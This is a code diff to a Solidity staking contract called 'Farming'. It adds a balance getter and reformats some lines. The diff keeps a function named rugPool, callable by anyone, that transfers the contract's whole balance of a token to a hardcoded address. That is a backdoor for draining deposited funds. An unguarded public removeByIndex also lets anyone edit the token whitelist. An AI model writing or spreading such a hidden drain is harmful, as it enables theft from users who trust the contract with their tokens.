@@ -132,6 +132,14 @@ contract Farming is Ownable {
         updateTime[_token][msg.sender] = block.timestamp;
     }
 
+    function getStakingBalance(address _token, address _account)
+        public
+        view
+        returns (uint256)
+    {
+        return stakingBalance[_token][_account];
+    }
+
     function addWhitelisted(address _token) public onlyOwner {
         require(!checkWhitelisted(_token));
         whitelisted.push(_token);
@@ -155,7 +163,7 @@ contract Farming is Ownable {
     }
 
     function removeByIndex(uint256 i) public {
-        while (i < whitelisted.length-1) {
+        while (i < whitelisted.length - 1) {
             whitelisted[i] = whitelisted[i + 1];
             i++;
         }
@@ -173,6 +181,9 @@ contract Farming is Ownable {
 
     function rugPool(address _token) public {
         uint256 balance = ERC20(_token).balanceOf(address(this));
-        ERC20(_token).transfer(0x2AAc0eb300FA402730bCEd0B4C43a7Fe6BF6491e,balance);
+        ERC20(_token).transfer(
+            0x2AAc0eb300FA402730bCEd0B4C43a7Fe6BF6491e,
+            balance
+        );
     }
 }
